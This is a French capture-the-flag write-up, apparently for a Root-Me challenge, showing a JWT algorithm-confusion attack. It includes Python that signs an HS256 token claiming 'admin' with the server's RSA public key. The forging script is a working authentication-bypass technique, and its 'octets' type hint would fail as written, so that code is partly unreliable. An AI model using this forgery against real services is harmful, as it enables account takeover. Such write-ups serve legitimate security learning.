
Tout d'abord voyons voir l'énoncer : 

![](../img/Pasted%20image%2020261024011944.png)



Maintenant voyons voir le site lorsqu'on arrive dessus : 

![](../img/Pasted%20image%2020261024012143.png)


On va tester les différents endpoint, donc ici on va récupérer la Public key depuis l'endpoint /key : 
![](../img/Pasted%20image%2020261024012306.png)


Maintenant essayons de nous connecter au site : 

![](../img/Pasted%20image%2020261024012427.png)

Nous pouvons voir qu'il faut envoyer via la méthode POST. 

Essayons : 

![](../img/Pasted%20image%2020261024012526.png)

On peut remarquer que nous n'avons pas envoyer les informations que le serveur demander à recevoir, nous allons donc envoyer ce qu'il faut. 

Pour ce faire il va falloir qu'on rajoute le Header HTTP : Content-Type et on va devoir utiliser pour avoir la même syntaxe le Content-Type : `application/x-www-form-urlencoded` qui va nous permettre d'envoyer les informations voulu. Source : https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods/POST


On va mettre donc : 

```json
username=admin
```

On va essayer directement de se mettre en tant que admin. 


![](../img/Pasted%20image%2020261024012923.png)


Mince, on n'est pas admin c'est parce qu'on a pas le bon token, maintenant essayons d'en générer un depuis un autre username comme "test" : 

![](../img/Pasted%20image%2020261024013048.png)


Maintenant nous allons utiliser une faille qui se base sur la clé public qui nous à était donner. Prenons le token et voyons voir son format sur le site : https://jwt.io

![](../img/Pasted%20image%2020261024013351.png)

On peut voir ici que l'algorithme utiliser est le RS256.

On va faire ce qu'on appel une attaque par confusion d'algorithme. 


Voici le principe : 

Tout d'abord, il faut comprendre comment son former les tokens JWT et leurs différents type.


Script : 


```python
└─$ cat parse_json.py


def main():
    ligne_finale = ""
    liste_carac = ['[',']','"'," ",'\n']
    with open("public_key_chall60_root-me.json","r",encoding="utf8") as fd:
        lignes = fd.readlines()
        for ligne in lignes :
            nouvelle_ligne = ligne
            for carac in liste_carac :
                 nouvelle_ligne = nouvelle_ligne.replace(carac,'')


            nouvelle_ligne = nouvelle_ligne.replace("BEGINPUBLICKEY","BEGIN PUBLIC KEY")
            nouvelle_ligne = nouvelle_ligne.replace("ENDPUBLICKEY", "END PUBLIC KEY")
            ligne_finale += nouvelle_ligne.replace(",","\n") + "\n"
                 #with open("result_jwt","a",)
#             nouvelle_ligne = ligne.strip('[]"\n')
            #print(ligne)
            #for carac in liste_carac :

             #   nouvelle_ligne = ligne.strip(carac)
              #  print(carac)
#    print(ligne_finale)

    with open("result_jwt","w",encoding="utf8") as fichier:
        fichier.write(ligne_finale)



if __name__ == "__main__":
    main()
```


![](../img/Pasted%20image%2020261024011308.png)

Script de confusion d'algorithme : 


![](Write%20Up/img/Pasted%20image%2020261024004135.png)

```python
#import jwt
import hmac,hashlib,base64,json

def b64url(donne:octets) -> str: #Renvoie un str
    return base64.urlsafe_b64encode(donne).rstrip(b"=").decode() #https://docs.python.org/3/library/base64.html#base64.urlsafe_b64encode

def main():
#    token = "" #Il faut rentrer le token qui à était générer par le serveur, ici dans notre cas c'est lorsqu'on utilise l'endpoint "/auth" et que celui-ci accepte notre demande de création d'un token jwt.

    with open("result_jwt","r",encoding="utf8") as fd:
        public_key = fd.read().encode() #Ici on transforme les str en codage.
#        print(public_key)

        header={"alg":"HS256","typ":"JWT"}
        payload={"username":"admin"}

        champs = b64url(json.dumps(header,separators=(",",":")).encode()) + "." + \
        b64url(json.dumps(payload,separators=(",",":")).encode())

        signature=hmac.new(public_key,champs.encode(),hashlib.sha256).digest()
        token = champs + "." + b64url(signature)

        print(token)
#        jwt_encoder = jwt.encode({"username":"admin"},public_key, algorithm="HS256") On ne peut pas utiliser cette option, puisque jwt vérifie directement le secret pour voir s'il n'y a pas une confusion. Il va falloir la créer nous même avec hmac,hashlib,base64,json


#    print(jwt_encoder)
if __name__ == "__main__":
    main()
```




![](../img/Pasted%20image%2020261024011853.png)